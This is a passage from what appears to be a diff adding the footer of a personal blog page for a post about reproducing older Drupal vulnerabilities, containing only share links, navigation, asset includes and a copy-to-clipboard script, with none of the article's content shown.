+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Drupal 2019年前的系列漏洞复现" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&is_video=false&description=Drupal 2019年前的系列漏洞复现" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Drupal 2019年前的系列漏洞复现&body=Check out this article: http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Drupal 2019年前的系列漏洞复现" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Drupal 2019年前的系列漏洞复现" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Drupal 2019年前的系列漏洞复现" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Drupal 2019年前的系列漏洞复现" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&name=Drupal 2019年前的系列漏洞复现&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&t=Drupal 2019年前的系列漏洞复现" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    R17a
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
